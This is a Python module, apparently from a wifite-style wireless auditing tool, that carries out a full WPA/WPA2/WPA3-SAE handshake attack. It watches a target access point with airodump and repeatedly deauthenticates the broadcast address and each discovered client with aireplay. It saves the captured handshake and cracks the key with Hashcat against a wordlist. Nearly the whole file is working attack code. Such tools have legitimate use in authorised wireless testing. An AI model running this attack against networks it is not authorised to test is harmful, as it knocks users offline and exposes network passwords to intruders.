#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.hashcat import Hashcat
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..util.output import OutputManager
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA
import time
import os
import re
from shutil import copy


class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False
        
        # Initialize TUI view if in TUI mode
        self.view = None
        if OutputManager.is_tui_mode():
            try:
                from ..ui.attack_view import WPAAttackView
                self.view = WPAAttackView(OutputManager.get_controller(), target)
            except Exception:
                # If TUI initialization fails, continue without it
                self.view = None

    def run(self):
        """Initiates full WPA handshake capture attack."""
        
        # Start TUI view if available
        if self.view:
            self.view.start()
            self.view.set_attack_type("WPA Handshake Capture")

        # Skip if target is not WPS
        if Configuration.wps_only and self.target.wps is False:
            Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}'
                     % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            return self._extracted_from_run_30(
                '{+} Not cracking handshake because {C}skip-crack{W} was used{W}'
            )
        # Check wordlist
        if Configuration.wordlist is None:
            return self._extracted_from_run_30(
                '{!} {O}Not cracking handshake because wordlist ({R}--dict{O}) is not set'
            )
        elif not os.path.exists(Configuration.wordlist):
            Color.pl('{!} {O}Not cracking handshake because wordlist {R}%s{O} was not found' % Configuration.wordlist)
            self.success = False
            return False

        # Determine if the target is WPA3-SAE
        target_is_wpa3_sae = self.target.primary_authentication == 'SAE'

        cracker = "Hashcat" # Default to Hashcat
        # TODO: Potentially add a fallback or user choice for aircrack-ng for non-SAE?
        # For now, transitioning WPA/WPA2 cracking to Hashcat as well for consistency,
        # as Hashcat mode 22000 (hccapx) is generally preferred over aircrack-ng.
        # Aircrack.crack_handshake might be removed or kept for WEP only in future.

        wordlist_name = os.path.split(Configuration.wordlist)[-1] if Configuration.wordlist else "default wordlist"
        crack_msg = f'Cracking {"WPA3-SAE" if target_is_wpa3_sae else "WPA/WPA2"} Handshake: Running {cracker} with {wordlist_name} wordlist'
        
        Color.pl(f'\n{{+}} {{C}}{crack_msg}{{W}}')
        
        # Update TUI view if available
        if self.view:
            self.view.add_log(crack_msg)
            self.view.update_progress({
                'status': f'Cracking with {cracker}...',
                'metrics': {
                    'Cracker': cracker,
                    'Wordlist': wordlist_name,
                    'Type': 'WPA3-SAE' if target_is_wpa3_sae else 'WPA/WPA2'
                }
            })

        try:
            key = Hashcat.crack_handshake(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1)
        except ValueError as e: # Catch errors from hash file generation (e.g. bad capture)
            error_msg = f"Error during hash file generation for cracking: {e}"
            Color.pl(f"[!] {error_msg}")
            if self.view:
                self.view.add_log(error_msg)
            key = None

        if key is None:
            fail_msg = f"Failed to crack handshake: {wordlist_name} did not contain password"
            Color.pl(f"{{!}} {{R}}{fail_msg}{{W}}")
            if self.view:
                self.view.add_log(fail_msg)
                self.view.update_progress({
                    'status': 'Cracking failed',
                    'progress': 0.0
                })
            self.success = False
        else:
            success_msg = f"Cracked {'WPA3-SAE' if target_is_wpa3_sae else 'WPA/WPA2'} Handshake Key: {key}"
            Color.pl(f"[+] {success_msg}\n")
            if self.view:
                self.view.add_log(success_msg)
                self.view.update_progress({
                    'status': 'Successfully cracked!',
                    'progress': 1.0,
                    'metrics': {
                        'Key': key,
                        'Status': 'Success'
                    }
                })
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        return self.success

    # TODO Rename this here and in `run`
    def _extracted_from_run_30(self, arg0):
        Color.pl(arg0)
        self.success = False
        return False

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                return None

            self.clients = []

            # Try to load existing handshake
            if not Configuration.ignore_old_handshakes:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture',
                                  'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': f'Listening for handshake (clients: {len(self.clients)})',
                        'metrics': {
                            'Clients': len(self.clients),
                            'Deauth Timer': str(deauth_timer),
                            'Timeout': str(timeout_timer)
                        }
                    })
                
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')

                # Check file size before copying to prevent memory issues
                try:
                    file_size = os.path.getsize(cap_file)
                    max_cap_size = 50 * 1024 * 1024  # 50MB limit
                    if file_size > max_cap_size:
                        Color.pl('\n{!} {O}Warning: Capture file is large (%d MB), may cause memory issues{W}' % (file_size // (1024*1024)))
                except (OSError, IOError):
                    pass

                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  airodump_target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W}')
                    Color.pl('')
                    
                    # Update TUI view
                    if self.view:
                        self.view.add_log('Captured handshake!')
                        self.view.update_progress({
                            'status': 'Handshake captured successfully',
                            'progress': 1.0,
                            'metrics': {
                                'Handshake': '✓',
                                'Clients': len(self.clients)
                            }
                        })
                    
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                    break  # Exit the capture loop
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'Handshake capture',
                                      'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)
                        
                        # Update TUI view
                        if self.view:
                            self.view.add_log(f'Discovered new client: {client.station}')

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)

        return handshake

    @staticmethod
    def load_handshake(bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    @staticmethod
    def save_handshake(handshake):
        """
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        """
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = f'handshake_{essid_safe}_{bssid_safe}_{date}.cap'
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
        Color.pl('{G}saved{W}')
        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename

    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """
        if Configuration.no_deauth:
            return

        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'Handshake capture',
                          'Deauthing {O}%s{W}' % target_name)
            
            # Update TUI view
            if self.view:
                self.view.add_log(f'Sending deauth to {target_name}')
            
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target

    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2' \
             ',        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
    Configuration.exit_gracefully()
